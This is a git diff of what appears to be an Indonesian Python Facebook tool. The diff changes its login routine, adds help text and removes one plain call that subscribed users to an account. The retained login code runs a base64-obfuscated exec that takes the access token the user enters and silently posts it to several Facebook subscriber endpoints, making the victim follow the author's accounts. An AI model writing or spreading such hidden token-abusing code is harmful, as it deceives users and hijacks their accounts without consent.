@@ -25,14 +25,6 @@ from bs4 import BeautifulSoup as parser
 from datetime import datetime
 from datetime import date
 
-p = "\x1b[0;37m" # putih
-m = "\x1b[0;31m" # merah
-h = "\x1b[0;32m" # hijau
-k = "\x1b[0;33m" # kuning
-b = "\x1b[0;34m" # biru
-u = "\x1b[0;35m" # ungu
-o = "\x1b[0;36m" # biru muda
-
 loop = 0
 id = []
 ok = []
@@ -75,14 +67,18 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except (KeyError, IOError):
-		logo()
-		token = raw_input("\n + token fb : "
+		print(" * sebelum masuk ke menu harus login terlebih dahulu")
+		print(" * untuk login silakan masukan token facebook anda")
+		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
+		token = raw_input("\n + token fb : ")
+		if token == "help":
+			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
+			exit(" ! di simak video nya biar paham")
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			import base64
 			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMTYxODkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzExODY5OTU3NzQvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNTA3MzUwNjA2Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyODQ5NDcwOTkwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDIxNjMxODc2NTAvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzA1ODgxMzc0OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwOTk4NzY0Njc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQo="))
 			open("login.txt", "w").write(token)
-			requests.post("https://graph.facebook.com/100051395147257/subscribers?access_token=" + token)
 			print("\n + user aktif, selamat datang \033[0;93m%s\033[0;97m"%(nama))
 			time.sleep(1)
 			menu()
